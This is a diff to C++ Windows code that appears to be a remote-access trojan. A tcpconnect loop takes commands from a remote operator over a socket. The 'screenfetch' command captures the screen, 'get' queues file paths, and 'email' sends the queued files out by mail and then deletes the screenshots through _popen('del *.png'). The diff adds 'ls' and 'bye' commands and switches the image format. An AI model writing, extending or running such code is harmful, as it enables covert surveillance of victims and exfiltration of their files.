@@ -1,7 +1,7 @@
 #include "util.h"
 #include <minwinbase.h>
 
-void sendemail(list<string> l)
+void sendemail(list<string> &l)
 {
 	bool bError = false;
 
@@ -288,13 +288,15 @@ void tcpconnect(char *addr,char*  port)
 		if(a1=="email")
 		{
 			sendemail(l);
-			_popen("del *.jpg", "w");
+			l.clear();
+			_popen("del *.png", "w");
 			send(connect_socket, "end", buflen, 0);
 		}
 		else if(a1=="screenfetch")
 		{
 			string s = to_string(pn);
-			s += ".jpg";
+			s += ".png";
+			//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScreenCapture, s.c_str(), 0, NULL);
 			ScreenCapture(s.c_str());
 			char   path[MAX_PATH];
 			getcwd(path, MAX_PATH);
@@ -307,6 +309,18 @@ void tcpconnect(char *addr,char*  port)
 		else if (a1 == "get")
 		{
 			l.push_back(a2);
+			send(connect_socket, "end", buflen, 0);
+		}
+		else if(a1=="bye")
+		{
+			break;
+		}
+		else if(a1=="ls")
+		{
+			for(auto it=l.begin();it!=l.end();++it)
+			{
+				send(connect_socket, (*it).c_str(), buflen, 0);
+			}
 			send(connect_socket, "end", buflen, 0);
 		}
 		else
